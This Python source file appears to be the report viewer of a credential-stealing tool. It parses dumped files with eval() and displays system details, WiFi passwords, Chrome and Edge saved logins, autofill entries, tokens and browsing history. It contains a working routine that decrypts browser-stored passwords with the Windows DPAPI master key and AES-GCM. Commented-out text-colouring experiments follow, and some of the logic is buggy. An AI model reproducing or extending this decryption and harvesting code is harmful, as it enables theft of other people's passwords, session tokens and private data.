import os
from datetime import timezone, datetime,timedelta
import win32crypt 
from Crypto.Cipher import AES
import base64
profile_path=''
import tkinter as tk
from termcolor import colored




def display_text(text):
    root = tk.Tk()
    root.configure(background='black')
    frame = tk.Frame(root, bg='black')
    frame.pack(fill='both', expand=True)
    text_widget = tk.Text(frame, wrap='word', bg='black', fg='white', font=('Courier New', 12))
    text_widget.insert('1.0', text)
    text_widget.pack(side='left', fill='both', expand=True)
    v_scrollbar = tk.Scrollbar(frame, orient='vertical', command=text_widget.yview)
    v_scrollbar.pack(side='right', fill='y')
    text_widget.configure(yscrollcommand=v_scrollbar.set)
    h_scrollbar = tk.Scrollbar(root, orient='horizontal', command=text_widget.xview)
    h_scrollbar.pack(side='bottom', fill='x')
    text_widget.configure(xscrollcommand=h_scrollbar.set)
    root.mainloop()

def chrome_data_and_time(chrome_date):
    try:return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
    except Exception:return None

def password_decryption(password: bytes, key):
    encryption_key =base64.b64decode(key)[5:]
    encryption_key=win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]#encryption key
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(password)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        try:return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception:return "No Passwords"





    
def system_info_basic_configuration(file_name,path):
    modified_data=''
    list1=['system','architecture','mashine','network_name','platform','prosessor','python_comp','python_version','revision_py','addisional_info','host_name','ip_address','network_interface','profile','password']
    with open(path+'\\'+file_name,'r',encoding='utf-8')as file:
        row_data=eval(file.read())
    modified_data+='_'*36+'system information'+'_'*36+'\n\n'
    modified_data+="".join("{:<{}}|{:>{}}\n".format(str(list1[num]),45,str(row_data[num]),45) for num in range(12))
    modified_data+='_'*38+'wifi passwords'+'_'*38+'\n\n'
    modified_data+="".join("{:<{}}|{:>{}}\n".format(str(row_data[13][num]),45,str(row_data[14][num][0]),45) for num in range(len(row_data[14])))
    return modified_data

def chrome_basic_data_configuration(file_name,path):
    modified_data=''
    list1=['gaia_given_name','gaia_id','gaia_name','hosted','last_downloads_gaia','managed_user_id','name','user_id','  ']
    list2=['birthday','cash_guid_related_to_bday','birth_year','gender','accept_language','selected_language','last_gaia_id','REFRESH_TOKEN_RECEIVED_TIME','REFRESH_TOKEN_RECEIVED_VALUE']
    with open(path+'\\'+file_name,'r',encoding='Utf-8') as file:
        row_data=eval(file.read())
    encryption_key=row_data.pop(0);profile_list=row_data.pop(0)
    for number,data in enumerate( row_data,start=0):
        preferanse_data=data.pop(-1)
        modified_data+="\n"+str(profile_list[number]).center(90,'=')+'\n'+"="*90+'\n\n'
        modified_data+=''.join("{:<{}}|{:>{}}".format(str(list1[num]),45,str(info),45)+"\n" for num,info in enumerate(data,start=0))
        modified_data+="\n"+"_"*37+" preferance data"+"_"*37+"\n"
        if not len(preferanse_data)<=2:modified_data+="".join("{: <{}}|{:>{}}".format(str(list2[num]),45,str(i),45)+"\n" for num,i in enumerate(preferanse_data,start=0))
        else:modified_data+="".join(str(l)+'\n' for l in preferanse_data)
    modified_data+='\n\nencryption key : '+str(encryption_key)
    return modified_data
            
def chrome_id_and_password(file_name,path):
    modified_data=''
    list1=['main_url','login_page_url','user_name','password','creation_date','last_used_date']
    with open(path+'\\'+file_name,'r',encoding='Utf-8') as file:
        row_data=eval(file.read())
    if row_data[0]=='default01':
        for round,value in enumerate(row_data[1],start=0):
            modified_data+='\n\n\n_'*42+'data'+str(round)+'_'*42+'\n\n'
            for data in value:
                modified_data+="\n"+"="*90+"\n"
                modified_data+="\n{:<{}}|{:>{}}".format(list1[0],45,str(data[0]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[1],45,str(data[1]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[2],45,str(data[2]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[3],45,str(password_decryption(data[3],encryption_key)),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[4],45,str(chrome_data_and_time(data[4])),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[5],45,str(chrome_data_and_time(data[5])),45)
    elif row_data[0] in ('error202:)','error404:)'):modified_data+='\n\n\n_'*43+'data'+"data"+'_'*43+'\n\n'+str(row_data[1][0][0]).center(90,'_')
    else:modified_data+='there-is-some-error-or-data-is-not-readable'.center(90,'-')
    row_data_part=row_data[3]
    profile_list=row_data_part.pop(0);encryption_key=row_data_part.pop(0)
    for num,data in enumerate(row_data_part,start=0):
        modified_data+="\n\n\n"+profile_list[num].center(90)
        if data.pop(0):
            for items in data:
                modified_data+="\n"+"="*90+"\n"
                modified_data+="\n{:<{}}|{:>{}}".format(list1[0],45,str(items[0]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[1],45,str(items[1]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[2],45,str(items[2]),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[3],45,str(password_decryption(items[3][0],encryption_key)),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[4],45,str(chrome_data_and_time(items[3][1])),45)
                modified_data+="\n{:<{}}|{:>{}}".format(list1[5],45,str(chrome_data_and_time(items[3][2])),45)
        else:modified_data+="\n"+"="*90+"\n"+str(items[0])
    return modified_data
       
def chrome_web_data_configuration(file_name,path):
    modified_data=''
    list1=['name','value','date_created','date_last_used','']
    with open(path+'\\'+file_name,'r',encoding='Utf-8') as file:
        row_data=eval(file.read())
    defalt_autofil=row_data[0];defalt_toke=row_data[1];profile_autofil=row_data[2];proile_token=row_data[3]
    if defalt_autofil[0]:
        for num,data in enumerate(defalt_autofil[1],start=0):modified_data+="\n"+"="*90+''.join("\n{: <{}}|{:>{}}".format(list1[num],45,str(data[num]),45))+'\n'
    else:modified_data+='\n'+'='*90+'\n'+str(defalt_autofil[1][0])+'\n'
    if defalt_toke[0]:modified_data+=''.join("\n"+"="*90+"\n{:<{}}|{:>{}}".format(data[0],45,data[1],45)for data in defalt_toke[1])
    else:modified_data+='\n'+'='*90+'\n'+str(defalt_toke[1][0])
    profile_list=profile_autofil.pop(0)
    for num,data in enumerate(profile_autofil,start=0):
        modified_data+="\n\n"+str(profile_list[num]).center(90,'=')
        if data.pop(0):
            for query in data:modified_data+="\n"+"="*90+"\n"+''.join("\n{:<{}}|{:>{}}".format(list1[count],45,str(value),45)for count,value in enumerate(query,start=0))+'\n'
        else:modified_data+='\n'+'='*90+'\n'+str(data[1][0])
    for num,data in enumerate(proile_token,start=0):
        modified_data+="\n\n"+str(profile_list[num]).center(90,'=')
        if data.pop(0):modified_data+=''.join("\n"+"="*90+"\n{:<{}}|{:>{}}".format(str(value[0]),45,str(value[1]),45)for value in data)
        else:modified_data+="\n"+"="*90+"\n"+str(data[1][0])
    return modified_data

def chrome_history_data_configuration(file_name,path):
    modified_data=''
    list1=['Url','Title','Visit_count']
    with open(path+'\\'+file_name,'r',encoding='Utf-8')as file:
        row_data=eval(file.read())  
    if row_data[0]:
        keyword=row_data[1];visisted_site=row_data[2]
        if keyword[0]:modified_data+='\n'+'keyword value'.center(90,'=')+'\n'+''.join(f'{num}. {data}\n' for num,data in enumerate(keyword[1],start=0))
        else:modified_data+='\n'+'- unable to fatch data of keyword default -'.center(90,'!')
        if visisted_site[0]:
            modified_data+='\n'+' visisted site '.center(90,'=')+'\n'
            for data in visisted_site[1]:modified_data+='='*90+''.join('\n{: <{}}|{:>{}}'.format(list1[num],20,str(value),70) for num,value in enumerate(data,start=0))+'\n'
        else:modified_data+'\n'+'- unable to fatch data of visited site default '.center(90,'!')+'\n'
    else:modified_data+='\n'+'path of default history data not exist'.center(90,'!')+'\n'
    profile_list=row_data[3];child_root=row_data[4]
    if bool(profile_list):
        for num,items in enumerate(child_root[0],start=0):
            modified_data+='\n\n'+'='*90+'\n'+profile_list[num].center(90,'=')+'\n'+'='*90+'\n'
            if items[0]:
                keyword=items[1];visisted_site=items[2]
                if keyword[0]:modified_data+='\n'+str(profile_list[num]).center(90,'=')+'\n'+''.join('\n'+str(i) for i in keyword[1])
                else:modified_data+='\n'+'unable to fatch data of keyword'.center(90,'=')+'\n'
                if visisted_site[0]:modified_data+='\n'+'visisted site'.center(90,'=')+'\n'+''.join('\n'+'='*90+''.join("\n{:<{}}|{:>{}}".format(list1[num],20,str(i),70)for num,i in enumerate(data))for data in visisted_site[1])#:) i just wanna maintain the structure so i wrote that big line of code in 1 :)
                else:modified_data+='\n'+'unable to fatch data of visited site'.center(90,'!')+'\n'
            else:modified_data+='\n'+'path of history data not exist'.center(90,'!')+'\n'
    else:modified_data+='first_test_failed(no list of profile ound)'+'\n2nd step faild (no data in profils)'if not bool(child_root) else +"\n"+"2nd step passed (data in profils)\ncurrently no way to extraact data like that\nif u devloper u can extract it by coding skill or by\ninding the exact order of proile are diserbuted all the best"
    return modified_data

def edge_data_configuration(file_name,path):
    modified_data=''
    list1=['edge acc cid','first name','last name','gaia id','gaia name','user name','encryption_key','']
    with open(path+'\\'+file_name,'r',encoding='Utf-8') as file:
        row_data=eval(file.read())
    encryption_key=row_data[0][6];child_data=row_data[1]
    modified_data+='\n'+'edge_data'.center(90,'=')+''.join('\n{:<{}}|{:>{}}'.format(list1[num],20,str(value),70)if not num==6 else '\n'+'='*90+'\n\n' for num,value in enumerate(row_data[0],start=0))
    if child_data.pop(0):
        for i in child_data:
            modified_data+='\n'+'edge_id password'.center(90,'=')
            modified_data+='\n{: <{}}|{:>{}}'.format('origin url',20,str(i[0]),70)
            modified_data+='\n{: <{}}|{:>{}}'.format(' username_elements',20,str(i[1]),70)
            modified_data+='\n{: <{}}|{:>{}}'.format('password_value',20,str(password_decryption(i[2],encryption_key)),70)
            modified_data+='\n{: <{}}|{:>{}}'.format('date_created',20,str(chrome_data_and_time(i[3])),70)
            modified_data+='\n{: <{}}|{:>{}}'.format('date_last_used',20,str(chrome_data_and_time(i[4])),70)
    else:modified_data+='\n'+'edge_id password'.center(90,'=')+'\n'+str(child_data[0])
    return modified_data

       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
        
# import subprocess
# import tkinter as tk
# import tkinter as tk

# def parse_text_with_color(text):
#     parsed_text = ''
#     current_color = 'black'
#     in_color_block = False

#     for char in text:
#         if char == '[':
#             in_color_block = True
#         elif char == '>':
#             color_start_index = text.find('>', text.index(char))
#             color_name = text[text.index(char) + 1: color_start_index]
#             parsed_text += f'[{color_name}]'
#             current_color = color_name
#         elif char == '<':
#             parsed_text += '[/' + current_color + ']'
#             in_color_block = False
#         elif not in_color_block:
#             parsed_text += char

#     return parsed_text
# def display_text_with_color(parsed_text):
#     root = tk.Tk()
#     root.configure(background='black')

#     text_widget = tk.Text(root, wrap='word', bg='black', font=('Courier New', 12))
#     text_widget.pack(fill='both', expand=True)

#     color_stack = ['white']  # Default color is white

#     index = '1.0'
#     segments = parsed_text.split('[')
#     for segment in segments:
#         if ']' in segment:
#             color_tag, segment_text = segment.split(']', 1)
#             if color_tag.startswith('>'):
#                 color_name = color_tag[1:]
#                 color_stack.append(color_name)
#                 text_widget.insert(index, segment_text, color_stack[-1])
#                 text_widget.tag_configure(color_stack[-1], foreground=color_stack[-1])
#             elif color_tag.startswith('</'):
#                 color_stack.pop()
#                 text_widget.insert(index, segment_text, color_stack[-1])
#             else:
#                 text_widget.insert(index, segment_text, color_stack[-1])
#         else:
#             text_widget.insert(index, segment, color_stack[-1])

#         index = text_widget.index('end')

#     root.mainloop()

# # Example text with color tags
# text = "This is a [>yellow>]sample text[<yellow<] with [>green>]colored[<green<] text."

# # Parse the text and display it with colors
# parsed_text = parse_text_with_color(text)
# print(parsed_text)
# display_text_with_color(parsed_text)

# # def display_text_with_color(text):
# #     root = tk.Tk()
# #     root.configure(background='black')

# #     text_widget = tk.Text(root, wrap='word', bg='black', fg='white', font=('Courier New', 12))
# #     text_widget.pack(fill='both', expand=True)

# #     # Parse the text to extract colored segments
# #     segments = text.split('\x1b')
# #     index = '1.0'
# #     for segment in segments:
# #         color_end_index = segment.find('m')
# #         if color_end_index != -1:
# #             color_code = segment[:color_end_index]
# #             segment_text = segment[color_end_index+1:]
# #             color = 'white'  # Default color
# #             if '33' in color_code:  # Yellow
# #                 color = 'yellow'
# #             elif '34' in color_code:  # Blue
# #                 color = 'blue'
# #             text_widget.insert(index, segment_text)
# #             text_widget.tag_add(color, index, f'{index}+{len(segment_text)}c')
# #             text_widget.tag_config(color, foreground=color)
# #         else:
# #             text_widget.insert(index, segment)
# #         index = text_widget.index('end')

# #     root.mainloop()

#     # color_mapping = {
#     #     '30': 'black',
#     #     '31': 'red',
#     #     '32': 'green',
#     #     '33': 'yellow',
#     #     '34': 'blue',
#     #     '35': 'magenta',
#     #     '36': 'cyan',
#     #     '37': 'white',